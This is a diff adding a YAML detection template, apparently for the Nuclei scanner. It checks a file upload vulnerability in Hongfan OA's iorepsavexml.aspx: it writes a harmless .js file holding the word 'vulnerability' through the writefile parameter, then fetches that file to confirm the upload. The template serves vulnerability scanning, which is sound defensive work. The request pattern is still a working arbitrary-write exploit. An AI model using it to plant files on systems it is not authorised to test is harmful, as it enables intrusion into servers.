@@ -1,0 +1,44 @@
+id: poc-yaml-hongfanoa-iorepsavexml-aspx-upload
+info:
+  name: 红帆OA iorepsavexml.aspx 文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-upload
+
+variables:
+  filename: "{{to_lower(rand_text_alphanumeric(10))}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: "upload-check"
+    method: POST
+    path:
+      - "/ioffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename={{filename}}.js&filepath=/upfiles/rep/pic/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "vulnerability"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "App_Themes/Blue/Styles.css"
+
+  - id: "file-verification"
+    method: GET
+    path:
+      - "/ioffice/upfiles/rep/pic/{{filename}}.js"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "vulnerability"
